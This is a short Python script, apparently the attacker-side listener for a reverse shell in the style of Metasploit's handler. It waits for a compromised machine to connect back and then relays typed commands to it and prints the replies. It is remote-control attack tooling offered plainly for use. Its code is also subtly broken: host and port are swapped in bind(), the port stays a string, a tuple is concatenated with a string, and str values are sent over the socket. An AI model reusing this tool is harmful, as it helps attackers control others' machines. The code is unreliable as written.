#imports
import sys
import socket


#main vars (lport, lhost like in metasploit)

LHOST = sys.argv[1]
LPORT = sys.argv[2]

#help menu
if LHOST == "--help":
    print("python listener.py <lhost> <lport>")
    exit()
    

#main thread

def main():

    lSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #create a INET socket object
    lSocket.bind((LPORT, LHOST)) #bind socket object to ip and port
    lSocket.listen(1) #make the socket listen to orders
    print("[+] Listening on port {}".format(str(LPORT))) #print that we got a connection on the LPORT 

    conn, addr= lSocket.accept() #wait for a connection
    print('[+] Got a connection from' + addr) #say to the user that he got a connection

    while True: 

        command = input("{}>".format(addr)) #get attacker input
        
        if 'exit' in command:
            conn.send('exit')
            conn.close()
            break
        else: 
            conn.send(command)
            print(conn.recv(1024))

main()

